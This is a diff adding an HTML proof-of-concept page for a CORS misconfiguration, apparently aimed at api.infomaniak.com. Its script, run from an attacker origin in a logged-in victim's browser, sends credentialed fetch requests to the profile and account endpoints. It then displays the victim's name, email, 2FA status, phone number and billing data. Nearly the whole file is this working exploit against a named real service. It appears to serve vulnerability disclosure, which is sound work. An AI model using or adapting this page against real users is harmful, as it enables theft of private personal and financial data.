@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>CORS PoC</title></head>
+<body style="font-family:monospace;padding:20px;background:#0d1117;color:#c9d1d9">
+<h2 style="color:#f0883e">CORS PoC — api.infomaniak.com</h2>
+<p>Attacker domain: <strong id="origin" style="color:#f85149"></strong></p>
+<p>Victim must be logged in to infomaniak.com in this browser.</p>
+<button onclick="run()" style="background:#238636;color:#fff;border:none;padding:12px 24px;border-radius:6px;font-size:15px;cursor:pointer">▶ Run PoC</button>
+<h3 style="color:#79c0ff">① Profile Data (name, email, 2FA status):</h3>
+<pre id="out1" style="background:#161b22;padding:16px;border-radius:8px;white-space:pre-wrap;border:1px solid #30363d">Click Run PoC...</pre>
+<h3 style="color:#79c0ff">② Account Data (phone number, billing):</h3>
+<pre id="out2" style="background:#161b22;padding:16px;border-radius:8px;white-space:pre-wrap;border:1px solid #30363d">Click Run PoC...</pre>
+<script>
+document.getElementById('origin').innerText = window.location.origin;
+async function run() {
+  document.getElementById('out1').innerHTML = 'Fetching...';
+  document.getElementById('out2').innerHTML = 'Fetching...';
+  try {
+    const r1 = await fetch('https://api.infomaniak.com/1/profile', {
+      credentials: 'include'
+    });
+    const d1 = await r1.json();
+    document.getElementById('out1').innerHTML =
+      '<span style="color:#3fb950">✓ HTTP '+r1.status+' — SUCCESS — data read from UNTRUSTED origin: '+window.location.origin+'</span>\n\n'
+      + JSON.stringify(d1.data, null, 2);
+  } catch(e) {
+    document.getElementById('out1').innerHTML =
+      '<span style="color:#f85149">✗ BLOCKED: '+e+'</span>';
+  }
+  try {
+    const r2 = await fetch('https://api.infomaniak.com/1/account', {
+      credentials: 'include'
+    });
+    const d2 = await r2.json();
+    document.getElementById('out2').innerHTML =
+      '<span style="color:#3fb950">✓ HTTP '+r2.status+' — SUCCESS — phone number and billing data exposed</span>\n\n'
+      + JSON.stringify(d2.data, null, 2);
+  } catch(e) {
+    document.getElementById('out2').innerHTML =
+      '<span style="color:#f85149">✗ BLOCKED: '+e+'</span>';
+  }
+}
+</script>
+</body>
+</html>
